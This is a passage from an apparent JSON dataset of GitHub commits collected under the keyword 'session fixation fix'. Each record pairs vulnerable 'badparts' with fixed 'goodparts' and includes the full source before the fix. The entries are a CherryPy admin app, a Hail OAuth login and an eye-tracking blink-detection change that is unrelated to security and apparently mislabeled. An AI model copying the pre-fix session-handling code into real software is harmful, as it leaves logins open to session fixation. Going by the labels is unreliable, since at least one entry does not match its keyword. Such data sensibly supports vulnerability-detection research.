_detect_blink():"],"goodparts":["                fxend[:-1]              # saccades start will be end of last fixation","    def _detect_blinks():"]},{"diff":"\n         bk_groups = df[df['BKID'] != 0].groupby(by=['BKID'])\n         for bkid, bk in bk_groups:\n             bktime = bk['TIME'].values[0] - session_start_time\n-            bkdur = df.iloc[bk.tail(1).index[0]+1]['BKDUR']\n+            # Blink duration is calculated after the blink is over. Hence, the duration\n+            # is available in the next data entry ...\n+            next_id = bk.tail(1).index[0]+1\n+            if next_id >= len(df):\n+                # Out of bound\n+                continue\n+ \n+            bkdur = df.iloc[next_id]['BKDUR']\n+\n+            # Checks\n+            if bkdur == 0:\n+                # Session is over before blink is over ... eliminate this\n+                continue\n             if th_bkdur is not None and not inside_th(th_bkdur, bkdur):\n                 continue\n+\n             blinks.append([bkdur, bktime])\n         blinks = np.array(blinks)\n         return blinks\n","add":14,"remove":1,"filename":"\/ocular_movement_detection.py","badparts":["            bkdur = df.iloc[bk.tail(1).index[0]+1]['BKDUR']"],"goodparts":["            next_id = bk.tail(1).index[0]+1","            if next_id >= len(df):","                continue","            bkdur = df.iloc[next_id]['BKDUR']","            if bkdur == 0:","                continue"]},{"diff":"\n     session_start_time = df.iloc[0]['TIME']\n     fixations = _detect_fixations()\n     saccades = _detect_saccades()\n-    blinks = _detect_blink()\n+    blinks = _detect_blinks()\n     return fixations, saccades, blinks\n \n \n","add":1,"remove":1,"filename":"\/ocular_movement_detection.py","badparts":["    blinks = _detect_blink()"],"goodparts":["    blinks = _detect_blinks()"]}],"source":"\nimport pandas as pd import numpy as np from settings import _TH_FIXA_DUR from utils.checker import inside_th def _detect_by_gazepoint_filter(df, th_fxdur=None, th_scdur=None, th_bkdur=None): \"\"\" Detect fixations, saccades and blinks using the annotation provided by Gazepoint's internal filter. Parameters ---------- Returns ------- \"\"\" def _detect_fixations(): \"\"\" Take eye tracking data from outer function and perform detection. Only consider valid POG to calculate fixations. The fixations that fall outside of the screen area or a given threshold (if available) are eliminated. Returns ------- fixations: array-like of shape(n_fixations, 4) Each element in the array is a fixation described in the format [fxh, fxv, fxdur, fxtime], where: -fxh: position of fixation on horizontal axis. -fxv: position of fixation on vertical axis. -fxdur: duration in seconds of fixation. -fxtime: starting time in seconds since the start of the session. \"\"\" fx_groups=df.groupby(by=['FPOGID']) fixations=[] for fpogid, fpogs in fx_groups: fpogs_valid=fpogs[fpogs['FPOGV']==1] fxh=fpogs_valid['FPOGX'].mean() fxv=fpogs_valid['FPOGY'].mean() fxdur=fpogs_valid['FPOGD'].values[-1] fxtime=fpogs_valid['TIME'].values[0] -session_time if th_fxdur is not None and fxdur * 1000 <=th_fxdur: continue if 0 <=fxh <=1 and 0 <=fxv <=1: fixations.append([fxh, fxv, fxdur, fxtime]) return np.array(fixations) def _detect_saccades(): \"\"\" Calculate saccades based on a list of fixations. Saccades that fall outside of a given threshold(if available) are eliminated. Returns ------- saccades: array-like of shape(n_saccades, 6) Each element in the array is a saccade described in the format [scsh, scsv, sceh, scev, scdur, sctime], where: -scsh: position of starting POG on horizontal axis. -scsv: position of starting POG on vertical axis. -sceh: position of ending POG on horizontal axis. -scev: position of ending POG on vertical axis. -scdur: duration in seconds of saccade. -sctime: starting time in seconds since the start of the session. \"\"\" print(fixations[0:4]) fxend=(fixations[:, 2] +fixations[:, 3]).reshape(-1,1) print(fxend[:4]) time_diff=(fixations[1:][:, 3] -fxend[:-1, 0]).reshape(-1,1) print(time_diff[:4]) saccades=np.concatenate([ fixations[:-1][:,:2], fixations[1:][:,:2], time_diff, fxend[:-1] ], axis=1) return saccades def _detect_blink(): \"\"\" Take eye tracking data from outer function and perform detection. Blinks that fall outside of a given threshold(if available) are eliminated. Returns ------- blinks: array-like of shape(n_fixations, 2) Each element in the array is a blink described in the format [bkdur, bktime], where: -bkdur: duration in seconds of blink. -bktime: starting time in seconds since the start of the session. \"\"\" blinks=[] bk_groups=df[df['BKID'] !=0].groupby(by=['BKID']) for bkid, bk in bk_groups: bktime=bk['TIME'].values[0] -session_start_time bkdur=df.iloc[bk.tail(1).index[0]+1]['BKDUR'] if th_bkdur is not None and not inside_th(th_bkdur, bkdur): continue blinks.append([bkdur, bktime]) blinks=np.array(blinks) return blinks session_start_time=df.iloc[0]['TIME'] fixations=_detect_fixations() saccades=_detect_saccades() blinks=_detect_blink() return fixations, saccades, blinks def detect(df, method='gazepoint'): \"\"\" Detect fixations, saccades and blinks from eye-tracking data Parameters ---------- Returns ------- \"\"\" if method=='gazepoint': ocular_events=_detect_by_gazepoint_filter(df) return ocular_events if __name__==\"__main__\": print(_TH_FIXA_DUR) df_data=pd.read_csv('\/mnt\/DATA\/ltkhiem\/rcir\/dataset\/0000\/fixed_et\/tracker_data_log_0.tsv', delimiter='\\t') detect(df_data) ","sourceWithComments":"import pandas as pd\nimport numpy as np\nfrom settings import _TH_FIXA_DUR\nfrom utils.checker import inside_th\n\ndef _detect_by_gazepoint_filter(df, th_fxdur=None, th_scdur=None, th_bkdur=None):\n    \"\"\" \n    Detect fixations, saccades and blinks using the annotation provided \n    by Gazepoint's internal filter.\n\n    Parameters\n    ----------\n\n    Returns\n    -------\n\n    \"\"\"\n    def _detect_fixations():\n        \"\"\"\n        Take eye tracking data from outer function and perform detection.\n        Only consider valid POG to calculate fixations.\n        The fixations that fall outside of the screen area or a given threshold\n        (if available) are eliminated.\n\n        Returns\n        -------\n        fixations : array-like of shape (n_fixations, 4)\n            Each element in the array is a fixation described in the format\n            [fxh, fxv, fxdur, fxtime], where:\n            - fxh : position of fixation on horizontal axis.\n            - fxv : position of fixation on vertical axis.\n            - fxdur : duration in seconds of fixation.\n            - fxtime : starting time in seconds since the start of the session. \n        \"\"\"\n        fx_groups = df.groupby(by=['FPOGID'])\n        # Should we ignore the first fixation (as it could be the remaining \n        # of the last fixation in the previous session)?\n        fixations = []\n        for fpogid, fpogs in fx_groups:\n            fpogs_valid = fpogs[fpogs['FPOGV'] == 1]\n            fxh = fpogs_valid['FPOGX'].mean()\n            fxv = fpogs_valid['FPOGY'].mean()\n            fxdur = fpogs_valid['FPOGD'].values[-1]\n            fxtime = fpogs_valid['TIME'].values[0] - session_time\n\n            if th_fxdur is not None and fxdur * 1000 <= th_fxdur: \n                # Fixation duration requirement not meet.\n                continue\n\n            if 0 <= fxh <= 1 and 0 <= fxv <= 1:\n                # Only take fixation that is inside the screen.\n                fixations.append([fxh, fxv, fxdur, fxtime])\n        return np.array(fixations)\n\n    def _detect_saccades():\n        \"\"\"\n        Calculate saccades based on a list of fixations.\n        Saccades that fall outside of a given threshold (if available) are eliminated.\n\n        Returns\n        -------\n        saccades : array-like of shape (n_saccades, 6)\n            Each element in the array is a saccade described in the format\n            [scsh, scsv, sceh, scev, scdur, sctime], where:\n            - scsh : position of starting POG on horizontal axis.\n            - scsv : position of starting POG on vertical axis.\n            - sceh : position of ending POG on horizontal axis.\n            - scev : position of ending POG on vertical axis.\n            - scdur : duration in seconds of saccade.\n            - sctime : starting time in seconds since the start of the session. \n        \"\"\"\n        print(fixations[0:4])\n        fxend = (fixations[:, 2] + fixations[:, 3]).reshape(-1,1)\n        print(fxend[:4])\n        time_diff = (fixations[1:][:, 3] - fxend[:-1, 0]).reshape(-1,1)\n        print(time_diff[:4])\n        saccades = np.concatenate([\n                fixations[:-1][:, :2],  # start_x, start_y\n                fixations[1:][:, :2],   # end_x, end_y\n                time_diff,              # saccades duration\n                fxend[:-1]               # saccades start will be end of last fixation\n            ], axis=1)\n        return saccades\n        ### Remove prints, add threshold ... \n\n    def _detect_blink():\n        \"\"\"\n        Take eye tracking data from outer function and perform detection.\n        Blinks that fall outside of a given threshold (if available) are eliminated.\n\n        Returns\n        -------\n        blinks : array-like of shape (n_fixations, 2)\n            Each element in the array is a blink described in the format\n            [bkdur, bktime], where:\n            - bkdur : duration in seconds of blink.\n            - bktime : starting time in seconds since the start of the session. \n        \"\"\"\n        blinks = []\n        bk_groups = df[df['BKID'] != 0].groupby(by=['BKID'])\n        for bkid, bk in bk_groups:\n            bktime = bk['TIME'].values[0] - session_start_time\n            bkdur = df.iloc[bk.tail(1).index[0]+1]['BKDUR']\n            if th_bkdur is not None and not inside_th(th_bkdur, bkdur):\n                continue\n            blinks.append([bkdur, bktime])\n        blinks = np.array(blinks)\n        return blinks\n\n        \n    session_start_time = df.iloc[0]['TIME']\n    fixations = _detect_fixations()\n    saccades = _detect_saccades()\n    blinks = _detect_blink()\n    return fixations, saccades, blinks\n\n\ndef detect(df, method='gazepoint'):\n    \"\"\" Detect fixations, saccades and blinks from eye-tracking data\n    \n    Parameters\n    ----------\n\n    Returns\n    -------\n    \n    \"\"\"\n    if method=='gazepoint':\n        ocular_events = _detect_by_gazepoint_filter(df)\n    return ocular_events\n\n\n    \nif __name__ == \"__main__\":\n    print(_TH_FIXA_DUR)\n    df_data = pd.read_csv('\/mnt\/DATA\/ltkhiem\/rcir\/dataset\/0000\/fixed_et\/tracker_data_log_0.tsv', delimiter = '\\t')\n    detect(df_data) \n"}},"msg":":bug: [Bug Fix] Blank fixation group and Invalid blink segments\n\nIgnore empty fixation groups. Blinks that fall outside of the session are ignored."}},"https:\/\/github.com\/LairdCP\/weblcm-python":{"6548dcbb454b7223076c9f44f29cfbaa5e00f121":{"url":"https:\/\/api.github.com\/repos\/LairdCP\/weblcm-python\/commits\/6548dcbb454b7223076c9f44f29cfbaa5e00f121","html_url":"https:\/\/github.com\/LairdCP\/weblcm-python\/commit\/6548dcbb454b7223076c9f44f29cfbaa5e00f121","message":"weblcm-python: fix Session Fixation error\n\nWith the `get` method the session id will be saved first\nwhich results in session fixation vulnerability.\n\nBug 18953","sha":"6548dcbb454b7223076c9f44f29cfbaa5e00f121","keyword":"session fixation fix","diff":"diff --git a\/__main__.py b\/__main__.py\nindex 3df8d39..ac73166 100644\n--- a\/__main__.py\n+++ b\/__main__.py\n@@ -67,7 +67,9 @@ def force_session_checking():\n \t\t\t\t\"logSetting\", \"factoryReset\", \"reboot\", \"files\", \"datetime\"\n \t\t\t)\n \n-\tif not cherrypy.session.get('USERNAME', None):\n+\t#With the `get` method the session id will be saved which could result in session fixation vulnerability.\n+\t#Session ids will be destroyed periodically so we have to check 'USERNAME' to make sure the session is not valid after logout.\n+\tif not cherrypy.session._exists() or not cherrypy.session.get('USERNAME', None):\n \t\turl = cherrypy.url().split('\/')[-1]\n \t\tif url and \".html\" not in url and \".js\" not in url and any(path in url for path in paths):\n \t\t\traise cherrypy.HTTPError(401)\n","files":{"\/__main__.py":{"changes":[{"diff":"\n \t\t\t\t\"logSetting\", \"factoryReset\", \"reboot\", \"files\", \"datetime\"\n \t\t\t)\n \n-\tif not cherrypy.session.get('USERNAME', None):\n+\t#With the `get` method the session id will be saved which could result in session fixation vulnerability.\n+\t#Session ids will be destroyed periodically so we have to check 'USERNAME' to make sure the session is not valid after logout.\n+\tif not cherrypy.session._exists() or not cherrypy.session.get('USERNAME', None):\n \t\turl = cherrypy.url().split('\/')[-1]\n \t\tif url and \".html\" not in url and \".js\" not in url and any(path in url for path in paths):\n \t\t\traise cherrypy.HTTPError(401)\n","add":3,"remove":1,"filename":"\/__main__.py","badparts":["\tif not cherrypy.session.get('USERNAME', None):"],"goodparts":["\tif not cherrypy.session._exists() or not cherrypy.session.get('USERNAME', None):"]},{"diff":"\n \t\t\t\t\"logSetting\", \"factoryReset\", \"reboot\", \"files\", \"datetime\"\n \t\t\t)\n \n-\tif not cherrypy.session.get('USERNAME', None):\n+\t#With the `get` method the session id will be saved which could result in session fixation vulnerability.\n+\t#Session ids will be destroyed periodically so we have to check 'USERNAME' to make sure the session is not valid after logout.\n+\tif not cherrypy.session._exists() or not cherrypy.session.get('USERNAME', None):\n \t\turl = cherrypy.url().split('\/')[-1]\n \t\tif url and \".html\" not in url and \".js\" not in url and any(path in url for path in paths):\n \t\t\traise cherrypy.HTTPError(401)\n","add":3,"remove":1,"filename":"\/__main__.py","badparts":["\tif not cherrypy.session.get('USERNAME', None):"],"goodparts":["\tif not cherrypy.session._exists() or not cherrypy.session.get('USERNAME', None):"]}],"source":"\nimport os import cherrypy import weblcm_def import logging from weblcm_network_status import NetworkStatus from weblcm_network import NetworkInterfaces, NetworkConnections, NetworkConnection, NetworkAccessPoints, Version from weblcm_log import LogData, LogSetting from weblcm_swupdate import SWUpdate from weblcm_users import UserManage, LoginManage, LoginManageHelper from weblcm_files import FileManage, FilesManage, AWMCfgManage from weblcm_advanced import Reboot, FactoryReset from weblcm_datetime import DateTimeSetting from weblcm_settings import SystemSettingsManage class Root(object): \t_firewalld_disabled=os.system('systemctl is-active --quiet firewalld') \t@cherrypy.expose \t@cherrypy.tools.accept(media='application\/json') \t@cherrypy.tools.json_out() \tdef definitions(self, *args, **kwargs): \t\tplugins=[] \t\tfor k in cherrypy.request.app.config['plugins']: \t\t\tplugins.append(k) \t\tsettings={} \t\t \t\tsettings['firewalld_disabled']=Root._firewalld_disabled \t\tsettings['session_timeout']=SystemSettingsManage.get_session_timeout() \t\treturn{ \t\t\t'SDCERR': weblcm_def.WEBLCM_ERRORS, \t\t\t'PERMISSIONS': weblcm_def.USER_PERMISSION_TYPES, \t\t\t'PLUGINS': plugins, \t\t\t'SETTINGS': settings, \t\t} def force_tls(): \tif cherrypy.request.scheme==\"http\": \t\traise cherrypy.HTTPRedirect(cherrypy.url().replace(\"http:\", \"https:\"), status=301) def setup_http_server(): \thttpServer=cherrypy._cpserver.Server() \thttpServer.socket_host=\"::\" \thttpServer.socket_port=80 \thttpServer.thread_pool=0 \thttpServer.subscribe() \tcherrypy.request.hooks.attach('on_start_resource', force_tls) def force_session_checking(): \t\"\"\" \t\tRaise HTTP 401 Unauthorized client error if a session with invalid id tries to assess following resources. \t\tHTMLs still can be loaded to keep consistency, i.e. loaded from local cache or remotely. \t\"\"\" \tpaths=( \t\t\t\t\"connections\", \"connection\", \"accesspoints\", \"networkInterfaces\", \t\t\t\t\"file\", \"users\", \"firmware\", \"logData\", \"awm\", \t\t\t\t\"logSetting\", \"factoryReset\", \"reboot\", \"files\", \"datetime\" \t\t\t) \tif not cherrypy.session.get('USERNAME', None): \t\turl=cherrypy.url().split('\/')[-1] \t\tif url and \".html\" not in url and \".js\" not in url and any(path in url for path in paths): \t\t\traise cherrypy.HTTPError(401) @cherrypy.tools.register('before_finalize', priority=60) def secureheaders(): \theaders=cherrypy.response.headers \theaders['X-Frame-Options']='DENY' \theaders['X-XSS-Protection']='1; mode=block' \theaders['X-Content-Type-Options']='nosniff' \theaders['Content-Security-Policy']=\"default-src 'self'\" \t \theaders['Strict-Transport-Security']='max-age=31536000' if __name__=='__main__': \twebapp=Root() \twebapp.login=LoginManage() \twebapp.networkStatus=NetworkStatus() \twebapp.connections=NetworkConnections() \twebapp.connection=NetworkConnection() \twebapp.accesspoints=NetworkAccessPoints() \twebapp.networkInterfaces=NetworkInterfaces() \twebapp.version=Version() \twebapp.logData=LogData() \twebapp.logSetting=LogSetting() \twebapp.users=UserManage() \twebapp.file=FileManage() \twebapp.files=FilesManage() \twebapp.awm=AWMCfgManage() \twebapp.firmware=SWUpdate() \twebapp.reboot=Reboot() \twebapp.factoryReset=FactoryReset() \twebapp.datetime=DateTimeSetting() \tsetup_http_server() \tlogging.getLogger(\"cherrypy\").propagate=False \tcherrypy.request.hooks.attach('before_handler', force_session_checking) \t \tcherrypy.config.update({ \t\t\t'tools.sessions.timeout': SystemSettingsManage.get_session_timeout(), \t\t}) \tcherrypy.quickstart(webapp, '\/', config=weblcm_def.WEBLCM_PYTHON_SERVER_CONF_FILE) ","sourceWithComments":"import os\nimport cherrypy\nimport weblcm_def\nimport logging\nfrom weblcm_network_status import NetworkStatus\nfrom weblcm_network import NetworkInterfaces, NetworkConnections, NetworkConnection, NetworkAccessPoints, Version\nfrom weblcm_log import LogData, LogSetting\nfrom weblcm_swupdate import SWUpdate\nfrom weblcm_users import UserManage, LoginManage, LoginManageHelper\nfrom weblcm_files import FileManage, FilesManage, AWMCfgManage\nfrom weblcm_advanced import Reboot, FactoryReset\nfrom weblcm_datetime import DateTimeSetting\nfrom weblcm_settings import SystemSettingsManage\n\nclass Root(object):\n\n\t_firewalld_disabled = os.system('systemctl is-active --quiet firewalld')\n\n\t@cherrypy.expose\n\t@cherrypy.tools.accept(media='application\/json')\n\t@cherrypy.tools.json_out()\n\tdef definitions(self, *args, **kwargs):\n\n\t\tplugins = []\n\t\tfor k in cherrypy.request.app.config['plugins']:\n\t\t\tplugins.append(k)\n\n\t\tsettings = {}\n\t\t#Whether to display 'zone' on the 'edit connection' page\n\t\tsettings['firewalld_disabled'] = Root._firewalld_disabled\n\t\tsettings['session_timeout'] = SystemSettingsManage.get_session_timeout()\n\n\t\treturn {\n\t\t\t'SDCERR': weblcm_def.WEBLCM_ERRORS,\n\t\t\t'PERMISSIONS': weblcm_def.USER_PERMISSION_TYPES,\n\t\t\t'PLUGINS': plugins,\n\t\t\t'SETTINGS': settings,\n\t\t}\n\n\n#Redirect http to https\ndef force_tls():\n\n\tif cherrypy.request.scheme == \"http\":\n\t\traise cherrypy.HTTPRedirect(cherrypy.url().replace(\"http:\", \"https:\"), status=301)\n\ndef setup_http_server():\n\n\thttpServer = cherrypy._cpserver.Server()\n\thttpServer.socket_host = \"::\"\n\thttpServer.socket_port = 80\n\thttpServer.thread_pool = 0\n\thttpServer.subscribe()\n\n\tcherrypy.request.hooks.attach('on_start_resource', force_tls)\n\ndef force_session_checking():\n\n\t\"\"\"\n\t\tRaise HTTP 401 Unauthorized client error if a session with invalid id tries to assess following resources.\n\t\tHTMLs still can be loaded to keep consistency, i.e. loaded from local cache or remotely.\n\t\"\"\"\n\n\tpaths = (\n\t\t\t\t\"connections\", \"connection\", \"accesspoints\", \"networkInterfaces\",\n\t\t\t\t\"file\", \"users\", \"firmware\", \"logData\", \"awm\",\n\t\t\t\t\"logSetting\", \"factoryReset\", \"reboot\", \"files\", \"datetime\"\n\t\t\t)\n\n\tif not cherrypy.session.get('USERNAME', None):\n\t\turl = cherrypy.url().split('\/')[-1]\n\t\tif url and \".html\" not in url and \".js\" not in url and any(path in url for path in paths):\n\t\t\traise cherrypy.HTTPError(401)\n\n@cherrypy.tools.register('before_finalize', priority=60)\ndef secureheaders():\n\theaders = cherrypy.response.headers\n\theaders['X-Frame-Options'] = 'DENY'\n\theaders['X-XSS-Protection'] = '1; mode=block'\n\theaders['X-Content-Type-Options'] = 'nosniff'\n\theaders['Content-Security-Policy'] = \"default-src 'self'\"\n\t#Add Strict-Transport headers\n\theaders['Strict-Transport-Security'] = 'max-age=31536000'  # one year\n\n\nif __name__ == '__main__':\n\n\twebapp = Root()\n\n\twebapp.login = LoginManage()\n\n\twebapp.networkStatus = NetworkStatus()\n\twebapp.connections = NetworkConnections()\n\twebapp.connection = NetworkConnection()\n\twebapp.accesspoints = NetworkAccessPoints()\n\twebapp.networkInterfaces = NetworkInterfaces()\n\twebapp.version = Version()\n\n\twebapp.logData = LogData()\n\twebapp.logSetting = LogSetting()\n\n\twebapp.users = UserManage()\n\twebapp.file = FileManage()\n\twebapp.files = FilesManage()\n\twebapp.awm = AWMCfgManage()\n\n\twebapp.firmware = SWUpdate()\n\n\twebapp.reboot = Reboot()\n\twebapp.factoryReset = FactoryReset()\n\twebapp.datetime = DateTimeSetting()\n\n\tsetup_http_server()\n\n\tlogging.getLogger(\"cherrypy\").propagate = False\n\n\tcherrypy.request.hooks.attach('before_handler', force_session_checking)\n\n\t#Server config\n\tcherrypy.config.update({\n\t\t\t'tools.sessions.timeout': SystemSettingsManage.get_session_timeout(),\n\t\t})\n\n\tcherrypy.quickstart(webapp, '\/', config=weblcm_def.WEBLCM_PYTHON_SERVER_CONF_FILE)\n"}},"msg":"weblcm-python: fix Session Fixation error\n\nWith the `get` method the session id will be saved first\nwhich results in session fixation vulnerability.\n\nBug 18953"}},"https:\/\/github.com\/Monia234\/hail":{"d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9":{"url":"https:\/\/api.github.com\/repos\/Monia234\/hail\/commits\/d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9","html_url":"https:\/\/github.com\/Monia234\/hail\/commit\/d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9","message":"[auth] maybe fix auth flow & close security hole (#8052)\n\n* [auth] maybe fix auth flow & close security hole\n\nIt seems that sessions sometimes become inaccessible to auth. Using some\nlogging, I realized that `\/login` will set some session parameters that do not\nreappear in `\/oauth2callback`. While trying to debug this, I deleted my cookie\nand everything started working again. Luckily, my phone was still borked. The\nfix is to use `new_session` which I discovered with a big red warning in\naiohttp-session's docs: [Always use new_session() instead of get_session() in\nyour login views to guard against Session Fixation\nattacks!](https:\/\/aiohttp-session.readthedocs.io\/en\/stable\/reference.html#aiohttp_session.new_session).\n\nIf nothing else, we are now safe from session fixation attacks. I do not\nunderstand why this is necessary for correctness.\n\n* bump\n\n* bump","sha":"d780dd58f3861e7957edd3e6fac4f9bb9adc9ac9","keyword":"session fixation fix","diff":"diff --git a\/auth\/auth\/auth.py b\/auth\/auth\/auth.py\nindex e22a8ad2c2..6cd4e23d68 100644\n--- a\/auth\/auth\/auth.py\n+++ b\/auth\/auth\/auth.py\n@@ -59,7 +59,7 @@ async def login(request, userdata):\n         access_type='offline',\n         include_granted_scopes='true')\n \n-    session = await aiohttp_session.get_session(request)\n+    session = await aiohttp_session.new_session(request)\n     session['state'] = state\n     session['next'] = next\n \n","files":{"\/auth\/auth\/auth.py":{"changes":[{"diff":"\n         access_type='offline',\n         include_granted_scopes='true')\n \n-    session = await aiohttp_session.get_session(request)\n+    session = await aiohttp_session.new_session(request)\n     session['state'] = state\n     session['next'] = next\n \n","add":1,"remove":1,"filename":"\/auth\/auth\/auth.py","badparts":["    session = await aiohttp_session.get_session(request)"],"goodparts":["    session = await aiohttp_session.new_session(request)"]},{"diff":"\n         access_type='offline',\n         include_granted_scopes='true')\n \n-    session = await aiohttp_session.get_session(request)\n+    session = await aiohttp_session.new_session(request)\n     session['state'] = state\n     session['next'] = next\n \n","add":1,"remove":1,"filename":"\/auth\/auth\/auth.py","badparts":["    session = await aiohttp_session.get_session(request)"],"goodparts":["    session = await aiohttp_session.new_session(request)"]}],"source":"\nimport logging import aiohttp from aiohttp import web import aiohttp_session import uvloop import google.auth.transport.requests import google.oauth2.id_token import google.cloud.storage import google_auth_oauthlib.flow from hailtop.config import get_deploy_config from gear import setup_aiohttp_session, create_database_pool, \\ rest_authenticated_users_only, web_authenticated_developers_only, \\ web_maybe_authenticated_user, create_session, check_csrf_token from web_common import setup_aiohttp_jinja2, setup_common_static_routes, \\ set_message, render_template log=logging.getLogger('auth') uvloop.install() deploy_config=get_deploy_config() routes=web.RouteTableDef() def get_flow(redirect_uri, state=None): scopes=[ 'https:\/\/www.googleapis.com\/auth\/userinfo.profile', 'https:\/\/www.googleapis.com\/auth\/userinfo.email', 'openid' ] flow=google_auth_oauthlib.flow.Flow.from_client_secrets_file( '\/auth-oauth2-client-secret\/client_secret.json', scopes=scopes, state=state) flow.redirect_uri=redirect_uri return flow @routes.get('\/healthcheck') async def get_healthcheck(request): return web.Response() @routes.get('') @routes.get('\/') async def get_index(request): return aiohttp.web.HTTPFound(deploy_config.external_url('auth', '\/login')) @routes.get('\/login') @web_maybe_authenticated_user async def login(request, userdata): next=request.query.get('next', deploy_config.external_url('notebook', '')) if userdata: return aiohttp.web.HTTPFound(next) flow=get_flow(deploy_config.external_url('auth', '\/oauth2callback')) authorization_url, state=flow.authorization_url( access_type='offline', include_granted_scopes='true') session=await aiohttp_session.get_session(request) session['state']=state session['next']=next return aiohttp.web.HTTPFound(authorization_url) @routes.get('\/oauth2callback') async def callback(request): session=await aiohttp_session.get_session(request) if 'state' not in session: raise web.HTTPUnauthorized() state=session['state'] flow=get_flow(deploy_config.external_url('auth', '\/oauth2callback'), state=state) try: flow.fetch_token(code=request.query['code']) token=google.oauth2.id_token.verify_oauth2_token( flow.credentials.id_token, google.auth.transport.requests.Request()) email=token['email'] except Exception: log.exception('oauth2 callback: could not fetch and verify token') raise web.HTTPUnauthorized() dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute(\"SELECT * FROM users WHERE email=%s AND state='active';\", email) users=await cursor.fetchall() if len(users) !=1: raise web.HTTPUnauthorized() user=users[0] session_id=await create_session(dbpool, user['id']) del session['state'] session['session_id']=session_id next=session.pop('next') return aiohttp.web.HTTPFound(next) @routes.post('\/logout') @check_csrf_token @web_maybe_authenticated_user async def logout(request, userdata): if not userdata: return web.HTTPFound(deploy_config.external_url('notebook', '')) dbpool=request.app['dbpool'] session_id=userdata['session_id'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute('DELETE FROM sessions WHERE session_id=%s;', session_id) session=await aiohttp_session.get_session(request) if 'session_id' in session: del session['session_id'] return web.HTTPFound(deploy_config.external_url('notebook', '')) @routes.get('\/api\/v1alpha\/login') async def rest_login(request): callback_port=request.query['callback_port'] flow=get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback') authorization_url, state=flow.authorization_url( access_type='offline', include_granted_scopes='true') return web.json_response({ 'authorization_url': authorization_url, 'state': state }) @routes.get('\/users') @web_authenticated_developers_only() async def get_users(request, userdata): dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute('SELECT * FROM users;') users=await cursor.fetchall() page_context={ 'users': users } return await render_template('auth', request, userdata, 'users.html', page_context) @routes.post('\/users') @check_csrf_token @web_authenticated_developers_only() async def post_create_user(request, userdata): session=await aiohttp_session.get_session(request) dbpool=request.app['dbpool'] post=await request.post() username=post['username'] email=post['email'] is_developer=post.get('is_developer')=='1' async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute( ''' INSERT INTO users(state, username, email, is_developer) VALUES(%s, %s, %s, %s); ''', ('creating', username, email, is_developer)) user_id=cursor.lastrowid set_message(session, f'Created user{user_id}{username}.', 'info') return web.HTTPFound(deploy_config.external_url('auth', '\/users')) @routes.post('\/users\/delete') @check_csrf_token @web_authenticated_developers_only() async def delete_user(request, userdata): session=await aiohttp_session.get_session(request) dbpool=request.app['dbpool'] post=await request.post() id=post['id'] username=post['username'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: n_rows=await cursor.execute( ''' UPDATE users SET state='deleting' WHERE id=%s AND username=%s; ''', (id, username)) if n_rows !=1: assert n_rows==0 set_message(session, f'Delete failed, no such user{id}{username}.', 'error') set_message(session, f'Deleted user{id}{username}.', 'info') return web.HTTPFound(deploy_config.external_url('auth', '\/users')) @routes.get('\/api\/v1alpha\/oauth2callback') async def rest_callback(request): state=request.query['state'] code=request.query['code'] callback_port=request.query['callback_port'] try: flow=get_flow(f'http:\/\/127.0.0.1:{callback_port}\/oauth2callback', state=state) flow.fetch_token(code=code) token=google.oauth2.id_token.verify_oauth2_token( flow.credentials.id_token, google.auth.transport.requests.Request()) email=token['email'] except Exception: log.exception('fetching and decoding token') raise web.HTTPUnauthorized() dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute(\"SELECT * FROM users WHERE email=%s AND state='active';\", email) users=await cursor.fetchall() if len(users) !=1: raise web.HTTPUnauthorized() user=users[0] session_id=await create_session(dbpool, user['id']) return web.json_response({ 'token': session_id, 'username': user['username'] }) @routes.post('\/api\/v1alpha\/logout') @rest_authenticated_users_only async def rest_logout(request, userdata): session_id=userdata['session_id'] dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute('DELETE FROM sessions WHERE session_id=%s;', session_id) return web.Response(status=200) @routes.get('\/api\/v1alpha\/userinfo') async def userinfo(request): if 'Authorization' not in request.headers: log.info('Authorization not in request.headers') raise web.HTTPUnauthorized() auth_header=request.headers['Authorization'] if not auth_header.startswith('Bearer '): log.info('Bearer not in Authorization header') raise web.HTTPUnauthorized() session_id=auth_header[7:] if len(session_id) !=44: log.info('Session id !=44 bytes') raise web.HTTPUnauthorized() dbpool=request.app['dbpool'] async with dbpool.acquire() as conn: async with conn.cursor() as cursor: await cursor.execute(''' SELECT users.*, sessions.session_id FROM users INNER JOIN sessions ON users.id=sessions.user_id WHERE users.state='active' AND(sessions.session_id=%s) AND(ISNULL(sessions.max_age_secs) OR(NOW() < TIMESTAMPADD(SECOND, sessions.max_age_secs, sessions.created))); ''', session_id) users=await cursor.fetchall() if len(users) !=1: log.info(f'Unknown session id:{session_id}') raise web.HTTPUnauthorized() user=users[0] return web.json_response(user) async def on_startup(app): app['dbpool']=await create_database_pool() async def on_cleanup(app): dbpool=app['dbpool'] dbpool.close() await dbpool.wait_closed() def run(): app=web.Application() setup_aiohttp_jinja2(app, 'auth') setup_aiohttp_session(app) setup_common_static_routes(routes) app.add_routes(routes) app.on_startup.append(on_startup) app.on_cleanup.append(on_cleanup) web.run_app(deploy_config.prefix_application(app, 'auth'), host='0.0.0.0', port=5000) ","sourceWithComments":"import logging\nimport aiohttp\nfrom aiohttp import web\nimport aiohttp_session\nimport uvloop\nimport google.auth.transport.requests\nimport google.oauth2.id_token\nimport google.cloud.storage\nimport google_auth_oauthlib.flow\nfrom hailtop.config import get_deploy_config\nfrom gear import setup_aiohttp_session, create_database_pool, \\\n    rest_authenticated_users_only, web_authenticated_developers_only, \\\n    web_maybe_authenticated_user, create_session, check_csrf_token\nfrom web_common import setup_aiohttp_jinja2, setup_common_static_routes, \\\n    set_message, render_template\n\nlog = logging.getLogger('auth')\n\nuvloop.install()\n\ndeploy_config = get_deploy_config()\n\nroutes = web.RouteTableDef()\n\n\ndef get_flow(redirect_uri, state=None):\n    scopes = [\n        